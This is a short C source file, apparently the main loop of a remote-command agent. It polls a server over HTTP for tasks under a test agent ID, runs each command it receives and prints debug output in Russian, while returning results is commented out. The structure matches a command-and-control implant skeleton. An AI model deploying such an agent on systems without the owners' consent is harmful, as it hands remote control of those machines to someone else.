#include "transport.h"
#include "executable.h"

#include <stdio.h>
//#include <stdlib.h>
#include <unistd.h>

//TODO:
//перед любым взаимодействием с сервером - INIT!!!

int main() {
    TransportModule *active_channel = &http_transport;

    char agent_id[] = "agent_999";//for test
    
    char task_id[5] = {0};
    char command[256] = {0};
    char result[4096] = {0};

    while (active_channel->init() == 0) {
        if(active_channel->get_command(command, task_id,  sizeof(command), agent_id) == 0) {
            sleep(1);
            execute_command(command, result, sizeof(result));
            sleep(1);
            printf("[DEBUG] Задача %s выполнена агентом %s, результат: %s.\n", task_id, agent_id, result);
            //active_channel->init();
            //active_channel->send_result(result);
            active_channel->cleanup();
        } else {
            printf("[DEBUG] Задач нет.\n");
            fflush(stdout);
            sleep(1);
        }
        sleep(5);
    }

    return 0;
}
